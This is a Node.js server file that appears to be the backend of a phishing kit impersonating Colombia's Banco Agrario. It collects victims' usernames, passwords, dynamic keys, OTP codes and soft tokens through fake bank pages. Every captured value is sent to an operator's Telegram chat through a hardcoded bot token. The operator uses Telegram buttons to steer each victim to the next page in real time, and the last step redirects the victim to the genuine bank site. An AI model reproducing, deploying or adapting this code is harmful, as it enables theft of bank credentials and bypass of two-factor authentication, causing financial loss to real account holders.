const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  pingTimeout: 60000,
  pingInterval: 25000
});

// Telegram Bot Configuration
const TELEGRAM_TOKEN = '8132133334:AAGzAzqNvn7N5V_74NU5SwGvJwkJwb2Sd2c';
const CHAT_ID = '-4997787461';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Store active sessions - use sessionId as key
const sessions = new Map();
// Map socketId to sessionId
const socketToSession = new Map();

// Serve static files
app.use(express.static(__dirname));
app.use('/img', express.static(path.join(__dirname, 'img')));

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/password.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'password.html'));
});

app.get('/dinamica.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'dinamica.html'));
});

app.get('/otp.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'otp.html'));
});

app.get('/token.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'token.html'));
});

// Socket.IO Connection Handler
io.on('connection', (socket) => {
  console.log('New client connected:', socket.id);
  
  // Check if client is reconnecting with existing session
  const existingSessionId = socket.handshake.query.sessionId;
  let sessionId;
  let session;

  if (existingSessionId && sessions.has(existingSessionId)) {
    // Reconnecting - update socket ID
    sessionId = existingSessionId;
    session = sessions.get(sessionId);
    session.socketId = socket.id;
    console.log('Client reconnected with session:', sessionId);
  } else {
    // New session
    sessionId = uuidv4();
    session = {
      sessionId,
      socketId: socket.id,
      username: null,
      password: null,
      dinamica: null,
      otp: null,
      createdAt: new Date()
    };
    sessions.set(sessionId, session);
    console.log('New session created:', sessionId);
  }

  // Map socket to session
  socketToSession.set(socket.id, sessionId);

  socket.emit('session-created', { sessionId });

  // Handle username submission
  socket.on('submit-username', async (data) => {
    const sessionId = socketToSession.get(socket.id);
    const session = sessions.get(sessionId);
    if (session) {
      session.username = data.username;
      session.socketId = socket.id; // Update current socket ID
      
      const message = `🔐 *NUEVO ACCESO - BANCO AGRARIO*\n\n` +
                     `👤 *Usuario:* \`${data.username}\`\n` +
                     `🆔 *Sesión:* \`${session.sessionId}\`\n` +
                     `⏰ *Hora:* ${new Date().toLocaleString('es-CO')}`;
      
      const keyboard = {
        inline_keyboard: [
          [
            { text: '🔄 Pedir Logo', callback_data: `logo_${sessionId}` },
            { text: '🔢 Pedir Dinámica', callback_data: `dinamica_${sessionId}` }
          ],
          [
            { text: '🔑 Pedir Token', callback_data: `token_${sessionId}` },
            { text: '📱 Pedir OTP', callback_data: `otp_${sessionId}` }
          ],
          [
            { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` }
          ]
        ]
      };

      try {
        await bot.sendMessage(CHAT_ID, message, {
          parse_mode: 'Markdown',
          reply_markup: keyboard
        });
        // Inmediatamente redirigir a password, no esperar
        socket.emit('redirect', { url: '/password.html' });
      } catch (error) {
        console.error('Error sending to Telegram:', error);
        socket.emit('error', { message: 'Error al procesar' });
      }
    }
  });

  // Handle password submission
  socket.on('submit-password', async (data) => {
    const sessionId = socketToSession.get(socket.id);
    const session = sessions.get(sessionId);
    if (session) {
      session.password = data.password;
      session.socketId = socket.id; // Update current socket ID
      
      const message = `🔐 *CONTRASEÑA RECIBIDA*\n\n` +
                     `👤 *Usuario:* \`${session.username}\`\n` +
                     `🔑 *Contraseña:* \`${data.password}\`\n` +
                     `🆔 *Sesión:* \`${session.sessionId}\`\n` +
                     `⏰ *Hora:* ${new Date().toLocaleString('es-CO')}`;
      
      const keyboard = {
        inline_keyboard: [
          [
            { text: '🔄 Pedir Logo', callback_data: `logo_${sessionId}` },
            { text: '🔢 Pedir Dinámica', callback_data: `dinamica_${sessionId}` }
          ],
          [
            { text: '🔑 Pedir Token', callback_data: `token_${sessionId}` },
            { text: '📱 Pedir OTP', callback_data: `otp_${sessionId}` }
          ],
          [
            { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` }
          ]
        ]
      };

      try {
        await bot.sendMessage(CHAT_ID, message, {
          parse_mode: 'Markdown',
          reply_markup: keyboard
        });
        // Mantener overlay visible hasta que llegue comando de Telegram
        socket.emit('data-sent');
      } catch (error) {
        console.error('Error sending to Telegram:', error);
        socket.emit('error', { message: 'Error al procesar' });
      }
    }
  });

  // Handle dynamic key submission
  socket.on('submit-dinamica', async (data) => {
    const sessionId = socketToSession.get(socket.id);
    const session = sessions.get(sessionId);
    if (session) {
      session.dinamica = data.dinamica;
      session.socketId = socket.id; // Update current socket ID
      
      const message = `🔢 *CLAVE DINÁMICA RECIBIDA*\n\n` +
                     `👤 *Usuario:* \`${session.username}\`\n` +
                     `🔢 *Clave Dinámica:* \`${data.dinamica}\`\n` +
                     `🆔 *Sesión:* \`${session.sessionId}\`\n` +
                     `⏰ *Hora:* ${new Date().toLocaleString('es-CO')}`;
      
      const keyboard = {
        inline_keyboard: [
          [
            { text: '🔄 Pedir Logo', callback_data: `logo_${sessionId}` },
            { text: '🔢 Pedir Dinámica', callback_data: `dinamica_${sessionId}` }
          ],
          [
            { text: '🔑 Pedir Token', callback_data: `token_${sessionId}` },
            { text: '📱 Pedir OTP', callback_data: `otp_${sessionId}` }
          ],
          [
            { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` }
          ]
        ]
      };

      try {
        await bot.sendMessage(CHAT_ID, message, {
          parse_mode: 'Markdown',
          reply_markup: keyboard
        });
        // Mantener overlay visible hasta que llegue comando de Telegram
        socket.emit('data-sent');
      } catch (error) {
        console.error('Error sending to Telegram:', error);
        socket.emit('error', { message: 'Error al procesar' });
      }
    }
  });

  // Handle OTP submission
  socket.on('submit-otp', async (data) => {
    const sessionId = socketToSession.get(socket.id);
    const session = sessions.get(sessionId);
    if (session) {
      session.otp = data.otp;
      session.socketId = socket.id; // Update current socket ID
      
      const message = `📱 *CÓDIGO OTP RECIBIDO*\n\n` +
                     `👤 *Usuario:* \`${session.username}\`\n` +
                     `📱 *Código OTP:* \`${data.otp}\`\n` +
                     `🆔 *Sesión:* \`${session.sessionId}\`\n` +
                     `⏰ *Hora:* ${new Date().toLocaleString('es-CO')}`;
      
      const keyboard = {
        inline_keyboard: [
          [
            { text: '🔄 Pedir Logo', callback_data: `logo_${sessionId}` },
            { text: '🔢 Pedir Dinámica', callback_data: `dinamica_${sessionId}` }
          ],
          [
            { text: '🔑 Pedir Token', callback_data: `token_${sessionId}` },
            { text: '📱 Pedir OTP', callback_data: `otp_${sessionId}` }
          ],
          [
            { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` }
          ]
        ]
      };

      try {
        await bot.sendMessage(CHAT_ID, message, {
          parse_mode: 'Markdown',
          reply_markup: keyboard
        });
        // Mantener overlay visible hasta que llegue comando de Telegram
        socket.emit('data-sent');
      } catch (error) {
        console.error('Error sending to Telegram:', error);
        socket.emit('error', { message: 'Error al procesar' });
      }
    }
  });

  // Handle Token submission
  socket.on('submit-token', async (data) => {
    const sessionId = socketToSession.get(socket.id);
    const session = sessions.get(sessionId);
    if (session) {
      session.token = data.token;
      session.socketId = socket.id; // Update current socket ID
      
      const message = `🔑 *SOFT TOKEN RECIBIDO*\n\n` +
                     `👤 *Usuario:* \`${session.username}\`\n` +
                     `🔑 *Soft Token:* \`${data.token}\`\n` +
                     `🆔 *Sesión:* \`${session.sessionId}\`\n` +
                     `⏰ *Hora:* ${new Date().toLocaleString('es-CO')}`;
      
      const keyboard = {
        inline_keyboard: [
          [
            { text: '🔄 Pedir Logo', callback_data: `logo_${sessionId}` },
            { text: '🔢 Pedir Dinámica', callback_data: `dinamica_${sessionId}` }
          ],
          [
            { text: '🔑 Pedir Token', callback_data: `token_${sessionId}` },
            { text: '📱 Pedir OTP', callback_data: `otp_${sessionId}` }
          ],
          [
            { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` }
          ]
        ]
      };

      try {
        await bot.sendMessage(CHAT_ID, message, {
          parse_mode: 'Markdown',
          reply_markup: keyboard
        });
        // Mantener overlay visible hasta que llegue comando de Telegram
        socket.emit('data-sent');
      } catch (error) {
        console.error('Error sending to Telegram:', error);
        socket.emit('error', { message: 'Error al procesar' });
      }
    }
  });

  // Handle telegram bot commands
  socket.on('redirect-request', (data) => {
    socket.emit('redirect', { url: data.url });
  });

  // Handle disconnection
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
    // Don't delete session, just remove socket mapping
    socketToSession.delete(socket.id);
    console.log('Socket mapping removed, session preserved');
  });
});

// Telegram Bot Callback Handler
bot.on('callback_query', async (callbackQuery) => {
  const data = callbackQuery.data;
  const [action, sessionId] = data.split('_');

  console.log('Telegram callback received:', action, 'for session:', sessionId);

  const session = sessions.get(sessionId);
  if (!session) {
    console.error('Session not found:', sessionId);
    await bot.answerCallbackQuery(callbackQuery.id, { text: 'Sesión no encontrada o expirada' });
    return;
  }

  const socketId = session.socketId;
  console.log('Target socket ID:', socketId);

  try {
    if (action === 'logo') {
      io.to(socketId).emit('redirect', { url: '/index.html' });
      await bot.answerCallbackQuery(callbackQuery.id, { text: 'Redirigiendo a página de usuario...' });
    } else if (action === 'dinamica') {
      io.to(socketId).emit('redirect', { url: '/dinamica.html' });
      await bot.answerCallbackQuery(callbackQuery.id, { text: 'Redirigiendo a clave dinámica...' });
    } else if (action === 'token') {
      io.to(socketId).emit('redirect', { url: '/token.html' });
      await bot.answerCallbackQuery(callbackQuery.id, { text: 'Redirigiendo a soft token...' });
    } else if (action === 'otp') {
      io.to(socketId).emit('redirect', { url: '/otp.html' });
      await bot.answerCallbackQuery(callbackQuery.id, { text: 'Redirigiendo a OTP...' });
    } else if (action === 'finalizar') {
      io.to(socketId).emit('redirect', { url: 'https://www.bancoagrario.gov.co/' });
      await bot.answerCallbackQuery(callbackQuery.id, { text: 'Finalizando sesión...' });
      // Clean up session after finalizing
      sessions.delete(sessionId);
    }
  } catch (error) {
    console.error('Error handling callback:', error);
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Open http://localhost:${PORT} in your browser`);
});
